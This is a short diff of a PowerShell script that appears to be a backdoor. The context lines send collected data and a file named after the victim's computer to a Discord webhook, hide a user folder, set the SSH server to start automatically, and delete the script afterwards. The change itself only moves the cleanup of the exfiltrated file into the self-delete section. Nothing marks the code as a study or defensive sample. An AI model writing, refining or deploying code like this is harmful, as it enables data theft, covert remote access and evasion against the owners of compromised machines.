@@ -85,7 +85,7 @@ Get-Item "C:\Users\$uName" -Force | ForEach-Object {$_.Attributes = $_.Attribute
 ## Sends Discord Webhook
 Invoke-RestMethod -Uri $Webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json';
 upload_discord("$env:computername.fk")
-Remove-Item "$env:computername.fk" 
+
 
 ## goto Temp and make dir
 Set-Location $temp	
@@ -99,4 +99,5 @@ Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
 ## Self Delete
+Remove-Item "$PSScriptRoot/$env:computername.fk" 
 Remove-Item $PSCommandPath -Force 
